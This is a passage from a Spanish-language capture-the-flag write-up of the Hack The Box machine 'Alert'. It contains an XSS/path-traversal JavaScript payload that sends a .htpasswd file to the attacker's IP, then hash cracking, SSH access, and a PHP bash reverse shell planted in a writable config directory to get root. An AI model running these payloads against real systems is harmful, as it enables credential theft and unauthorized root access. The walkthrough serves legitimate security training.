└─$ echo "PHByZT48VmlydHVhbEhvc3QgKjo4MD4KICAgIFNlcnZlck5hbWUgYWxlcnQuaHRiCgogICAgRG9jdW1lbnRSb290IC92YXIvd3d3L2FsZXJ0Lmh0YgoKICAgIDxEaXJlY3RvcnkgL3Zhci93d3cvYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgRm9sbG93U3ltTGlua3MgTXVsdGlWaWV3cwogICAgICAgIEFsbG93T3ZlcnJpZGUgQWxsCiAgICA8L0RpcmVjdG9yeT4KCiAgICBSZXdyaXRlRW5naW5lIE9uCiAgICBSZXdyaXRlQ29uZCAle0hUVFBfSE9TVH0gIV5hbGVydFwuaHRiJAogICAgUmV3cml0ZUNvbmQgJXtIVFRQX0hPU1R9ICFeJAogICAgUmV3cml0ZVJ1bGUgXi8/KC4qKSQgaHR0cDovL2FsZXJ0Lmh0Yi8kMSBbUj0zMDEsTF0KCiAgICBFcnJvckxvZyAke0FQQUNIRV9MT0dfRElSfS9lcnJvci5sb2cKICAgIEN1c3RvbUxvZyAke0FQQUNIRV9MT0dfRElSfS9hY2Nlc3MubG9nIGNvbWJpbmVkCjwvVmlydHVhbEhvc3Q+Cgo8VmlydHVhbEhvc3QgKjo4MD4KICAgIFNlcnZlck5hbWUgc3RhdGlzdGljcy5hbGVydC5odGIKCiAgICBEb2N1bWVudFJvb3QgL3Zhci93d3cvc3RhdGlzdGljcy5hbGVydC5odGIKCiAgICA8RGlyZWN0b3J5IC92YXIvd3d3L3N0YXRpc3RpY3MuYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgRm9sbG93U3ltTGlua3MgTXVsdGlWaWV3cwogICAgICAgIEFsbG93T3ZlcnJpZGUgQWxsCiAgICA8L0RpcmVjdG9yeT4KCiAgICA8RGlyZWN0b3J5IC92YXIvd3d3L3N0YXRpc3RpY3MuYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgSW5kZXhlcyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzCiAgICAgICAgQWxsb3dPdmVycmlkZSBBbGwKICAgICAgICBBdXRoVHlwZSBCYXNpYwogICAgICAgIEF1dGhOYW1lICJSZXN0cmljdGVkIEFyZWEiCiAgICAgICAgQXV0aFVzZXJGaWxlIC92YXIvd3d3L3N0YXRpc3RpY3MuYWxlcnQuaHRiLy5odHBhc3N3ZAogICAgICAgIFJlcXVpcmUgdmFsaWQtdXNlcgogICAgPC9EaXJlY3Rvcnk+CgogICAgRXJyb3JMb2cgJHtBUEFDSEVfTE9HX0RJUn0vZXJyb3IubG9nCiAgICBDdXN0b21Mb2cgJHtBUEFDSEVfTE9HX0RJUn0vYWNjZXNzLmxvZyBjb21iaW5lZAo8L1ZpcnR1YWxIb3N0PgoKPC9wcmU+Cg==" | base64 -d; echo
<pre><VirtualHost *:80>
    ServerName alert.htb

    DocumentRoot /var/www/alert.htb

    <Directory /var/www/alert.htb>
        Options FollowSymLinks MultiViews
        AllowOverride All
    </Directory>

    RewriteEngine On
    RewriteCond %{HTTP_HOST} !^alert\.htb$
    RewriteCond %{HTTP_HOST} !^$
    RewriteRule ^/?(.*)$ http://alert.htb/$1 [R=301,L]

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

<VirtualHost *:80>
    ServerName statistics.alert.htb

    DocumentRoot /var/www/statistics.alert.htb

    <Directory /var/www/statistics.alert.htb>
        Options FollowSymLinks MultiViews
        AllowOverride All
    </Directory>

    <Directory /var/www/statistics.alert.htb>
        Options Indexes FollowSymLinks MultiViews
        AllowOverride All
        AuthType Basic
        AuthName "Restricted Area"
        AuthUserFile /var/www/statistics.alert.htb/.htpasswd
        Require valid-user
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

</pre>
```

- Existe una ruta: /var/www/statistics.alert.htb/.htpasswd que al parecer esta restringida.

Voy a volver a modificar el archivo `pwn.js` para apuntar a esta nueva ruta.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/alert/content]
└─$ cat pwn.js
var req = new XMLHttpRequest()
req.open('GET', 'http://alert.htb/messages.php?file=../../../../../../../../../../../var/www/statistics.alert.htb/.htpasswd', false)
req.send()



var data = new XMLHttpRequest()

data.open('GET', 'http://10.10.15.110/?pepe=' + btoa(req.responseText), false)
data.send()
```

Subo el archivo `exfiltrate.md` y genero un link de visualización para mandárselo al admin. Y me llega lo siguiente:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/alert/content]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.231.188 - - [01/Jan/2026 23:47:16] "GET /?pepe=PHByZT5hbGJlcnQ6JGFwcjEkYk1vUkJKT2ckaWdHOFdCdFExeFlEVFFkTGpTV1pRLwo8L3ByZT4K HTTP/1.1" 200 -
```

Descodificó lo data y veo lo siguiente:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/alert/content]
└─$ echo "PHByZT5hbGJlcnQ6JGFwcjEkYk1vUkJKT2ckaWdHOFdCdFExeFlEVFFkTGpTV1pRLwo8L3ByZT4K" | base64 -d; echo
<pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
</pre>
```

- `albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/` Es el hash MD5 de albert.

Crackeamos el hash con `hashcat`

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/alert/loot]
└─$ hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/:manchesterunited
```

- Las credenciales son albert:manchesterunited

Estas credenciales son para el subdominio `statistics` pero puedo utilizarlas para conectarme por SSH.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/alert/loot]
└─$ ssh albert@10.129.231.188

albert@alert:~$ id
uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management)
```

- Podemos ver que pertenecemos a un grupo llamado **managment.**

## Escalada de Privilegios

Enumere los puertos abiertos y me tope con una web en el puerto `8080`.

```bash
albert@alert:/opt/website-monitor/config$ ss -nltp
LISTEN                0                      4096                                       127.0.0.1:8080                                      0.0.0.0:*
```

Voy a realizar Port-Forwarding para acceder a ella desde mi host.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/alert/content]
└─$ ssh -L 8081:127.0.0.1:8080 albert@10.129.231.188
```

El directorio de la web se encuentra en`/opt/website-monitor` y me di cuenta de que esta corriendo como root.

- También note que en el directorio `config` tengo permisos de escritura gracias a mi grupo. Por lo cual me cree un `test.php` que ejecutaba el comando whoami

```bash
albert@alert:/opt/website-monitor/config$ ls -la
total 16
drwxrwxr-x 2 root   management 4096 Jan  2 06:06 .
drwxrwxr-x 7 root   root       4096 Oct 12  2024 ..
-rwxrwxr-x 1 root   management   49 Jan  2 06:06 configuration.php
-rwxrwxr-x 1 albert management   27 Jan  2 06:06 test.php

albert@alert:/opt/website-monitor/config$ cat test.php
<?php system("whoami"); ?>

albert@alert:/opt/website-monitor/config$ chmod +x test.php
```

Desde la web puedo acceder a la ruta de **/config/test.php** y ver que se me interpreta correctamente.

![](assets/Pasted%20image%2020260102000756.png)

Por lo cual puedo entablarme una reverse-shell.

- Modifico el test.php para lanzarme una reverse-shell, accedo a el y recibo la conexion.

```bash
albert@alert:/opt/website-monitor/config$ cat test.php
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.15.110/9001 0>&1'"); ?>
```

- Me llega la conexion

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/alert/content]
└─$ sudo nc -nlvp 9001
[sudo] password for wndr:
listening on [any] 9001 ...
connect to [10.10.15.110] from (UNKNOWN) [10.129.231.188] 33172
bash: cannot set terminal process group (987): Inappropriate ioctl for device
bash: no job control in this shell
root@alert:/opt/website-monitor/config# id
id
uid=0(root) gid=0(root) groups=0(root)
root@alert:/opt/website-monitor/config#
```

Flags

```bash
root@alert:/opt/website-monitor/config# cat /root/root.txt
8743aff614897fe2a46211c04d6bb588
root@alert:/opt/website-monitor/config# cat /home/albert/user.txt
d3f1669d2aea35e0a1e2b1202ba0ffa3
```

***PWNED***

![](assets/Pasted%20image%2020260102001433.png)